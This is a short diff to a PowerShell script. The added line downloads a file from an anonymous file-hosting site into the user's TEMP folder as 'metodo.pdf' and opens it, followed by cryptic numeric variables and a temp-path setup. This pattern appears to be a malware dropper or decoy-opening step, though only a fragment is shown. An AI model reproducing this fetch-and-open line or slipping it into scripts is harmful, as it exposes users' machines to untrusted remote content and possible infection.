@@ -1,3 +1,5 @@
+iwr 'https://files.catbox.moe/qvj6fx.pdf' -OutFile ($d = Join-Path $env:TEMP 'metodo.pdf'); ii $d
+
 $1 = 2565719
 $2 = 5439
 $tempPath = Join-Path $env:TEMP 'path.txt'
